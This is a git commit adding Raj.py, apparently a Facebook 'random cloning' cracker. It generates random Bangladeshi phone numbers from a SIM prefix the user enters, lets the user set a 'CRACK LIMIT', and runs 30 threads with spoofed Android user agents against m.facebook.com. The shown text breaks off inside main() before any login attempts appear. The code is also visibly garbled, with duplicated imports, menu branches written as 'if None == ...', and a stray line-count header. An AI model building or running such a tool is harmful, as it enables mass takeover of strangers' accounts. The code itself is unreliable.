9e62388da58fcce0b428925e53faf0e1525c89f8
rAj123456raj <113937104+rAj123456raj@users.noreply.github.com>
2023-03-17 02:57:03 +0600

    Create Raj.py

---
+++ Raj.py
@@ -0,0 +1,180 @@
+
+246 lines (236 sloc)  148 KB
+#------------------INFO------------------#
+#ADMIN <> MAHIN HASAN
+#CREDIT BY <> MAHIN
+#FACEBOOK <> MAHIN HASAN
+#TOOLS RANDOM CLONE
+#TAKE LOVE FROM ME 
+#3K SPECIAL GIFT 
+#OPEN SOURCE 
+#---------------CLOSED----------------#
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os
+import random
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import base64
+import os,sys,time,json,random,re,string,platform,base64
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import mechanize
+from requests.exceptions import ConnectionError
+import string
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ahmadAXI
+from datetime import datetime
+from bs4 import BeautifulSoup
+def ALEX():
+    os.system('clear')
+    jalan(logo)
+    jalan("\033[97;1m[\033[92;1m1\033[97;1m]\033[97;1mRANDOM CLONING")
+    jalan("\033[97;1m[\033[92;1m2\033[97;1m]\033[97;1mCONTACT ADMIN")
+    jalan('\033[97;1m[\033[92;1m3\033[97;1m]\033[97;1mFOLLOW GITHUB')
+    jalan("\033[97;1m[\033[92;1mE\033[97;1m]\033[97;1mEXIT")
+    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•")
+    opt = input('\033[97;1m[\033[92;1m?\033[97;1m]\033[97;1mCHOOSE \033[38;5;196m:\033[97;1m ')
+    if opt == '1':
+        main()
+    if None == '2':
+        os.system('xdg-open https://www.facebook.com/copy.link.erorr404')
+        return None
+    if None == '3':
+        os.system('xdg-open https://github.com/KgMAHIN')
+        return None
+    if None == 'E':
+        os.system('exit')
+        return None
+
+
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+P = '\x1b[1;97m' # 
+M = '\033[1;31m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;97m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+data,data2={},{}
+aman,cp,salah=0,0,0
+ubahP,fuck,pwBaru=[],[],[]
+ok = []
+cp = []
+id = []
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+url_lookup = "https://lookup-id.com/"
+url_mb = "https://m.facebook.com"
+url_ip = "https://www.httpbin.org/ip"
+header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0.10586.713; osmeta 8.3.47029472) AppleWebKit/602.1.1 (KHTML, like Gecko) Version/9.0 Safari/602.1.1 osmeta/8.3.47029472 Build/47029472 [FBAN/FBW;FBAV/75.0.0.50.22;FBBV/47052341;FBRV/0;FBDV/WindowsDevice;FBMD/Aspire one 1-431;FBSN/Windows;FBSV/10.0.10586.753;FBSS/1;FBCR/;FBID/desktop;FBLC/en_GB;FBOP/45]"}
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+done = False
+
+ugen=[]
+for x in range(100):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.001)
+
+logo = """
+\033[1;91m    __  ___  ___     __  __  ____  _   __
+\033[1;91m   /  |/  / /   |   / / / / /  _/ / | / /
+\033[38;5;208m  / /|_/ / / /| |  / /_/ /  / /  /  |/ / 
+\033[38;5;208m / /  / / / ___ | / __  / _/ /  / /|  /  
+\033[1;92m/_/  /_/ /_/  |_|/_/ /_/ /___/ /_/ |_/   
+ \033[1;92m╔=================================╗
+ |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mMAHIN           \033[1;92m | 
+ |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mMAHIN HASAN \033[1;92m     |   
+ |\033[1;97m[\033[1;92m❯\033[1;97m]\033[97;1mTOOLS     \033[1;31m:  \033[1;34mRANDOM\033[1;92m/\033[38;5;208mV1.4      \033[38;5;46m|
+ |\033[1;97m[\033[1;92m❯\033[1;97m]\033[97;1mNETWORK   \033[1;31m:  \033[1;97m3G\033[97;1m,4G,5G       \033[38;5;46m  |
+ \033[1;92m╚=================================╝"""
+
+khld = """\033[1;91m    __  ___  ___     __  __  ____  _   __
+\033[1;91m   /  |/  / /   |   / / / / /  _/ / | / /
+\033[38;5;208m  / /|_/ / / /| |  / /_/ /  / /  /  |/ / 
+\033[38;5;208m / /  / / / ___ | / __  / _/ /  / /|  /  
+\033[1;92m/_/  /_/ /_/  |_|/_/ /_/ /___/ /_/ |_/   
+ \033[1;92m╔=================================╗
+ |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mMAHIN           \033[1;92m | 
+ |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mMAHIN HASAN \033[1;92m     |   
+ |\033[1;97m[\033[1;92m❯\033[1;97m]\033[97;1mTOOLS     \033[1;31m:  \033[1;34mRANDOM\033[1;92m/\033[38;5;208mV1.4      \033[38;5;46m|
+ |\033[1;97m[\033[1;92m❯\033[1;97m]\033[97;1mNETWORK   \033[1;31m:  \033[1;97m3G\033[97;1m,4G,5G       \033[38;5;46m  |
+ \033[1;92m╚=================================╝"""
+def main():
+    user=[]
+    os.system('clear')
+    print(khld)
+    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•")
+    jalan('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mBD CODE : \033[1;97m016 \033[1;92m, \033[1;97m017 \033[1;92m, \033[1;97m018 \033[1;92m, \033[1;97m019')
+    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•")
+    kode = input('\033[97;1m[\033[92;1m?\033[97;1m]\033[97;1mENTER CODE  \033[38;5;196m:\033[97;1m ')
+    os.system('clear')
+    print(khld)    
+    limit = int(input(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mEXAMPLE    \033[38;5;196m: \033[1;35m10000\033[1;97m/\033[1;34m20000\033[1;97m/\033[1;32m30000\n \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\n \033[97;1m[\033[92;1m?\033[97;1m]\033[1;97mCRACK LIMIT \033[38;5;196m:\033[97;1m '))  
+    for nmbr in range(limit):
+	    nmp = ''.join(random.choice(string.digits) for _ in range(8))
+	    user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+	    os.system('clear')
+	    print(khld)
+	    tl = str(len(user))
+	    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•\033[38;5;46m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•")
+	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mSIM CODE : \033[1;97m'+kode)
+	    print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mTOTAL IDS : \033[1;92m'+tl)
+	    print('\033[97;1m[\033[92;1m✓\033[97;1m]
